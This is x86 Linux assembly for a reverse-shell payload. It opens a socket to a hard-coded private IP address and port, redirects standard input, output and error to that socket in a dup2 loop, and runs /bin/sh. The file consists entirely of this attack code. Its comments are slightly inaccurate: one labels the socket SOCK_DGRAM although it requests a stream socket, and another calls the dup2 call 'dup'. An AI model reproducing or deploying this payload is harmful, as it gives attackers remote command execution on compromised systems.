.intel_syntax noprefix
.set PORT,0x901f0002
.set IP,0x6638a8c0

.text 0

shell:
	# socket(PF_INET, SOCK_DGRAM, 0)
	xor eax, eax
	push 0x1
	pop ebx
	push eax
	push ebx
	push 0x2
	mov ecx,esp
	mov al,0x66
	int 0x80

	# connect()
	pop ebx
	inc ebx
	pop edi
	push IP
	push PORT
	push 0x10
	push ecx
	push eax
	mov ecx,esp
	mov al,0x66

	int 0x80
	pop ebx
	xor ecx,ecx
dup_loop:
	# dup(fd, {0,1,2})
	push 0x3f
	pop eax
	int 0x80
	inc ecx
	cmp cl,0x3
	jne dup_loop

	# execve("/bin/sh", NULL, NULL)	
	xor eax,eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx,esp
	push eax
	push ebx
	mov ecx,esp
	cdq
	mov al,0xb
	int 0x80
spin:
	jmp spin 
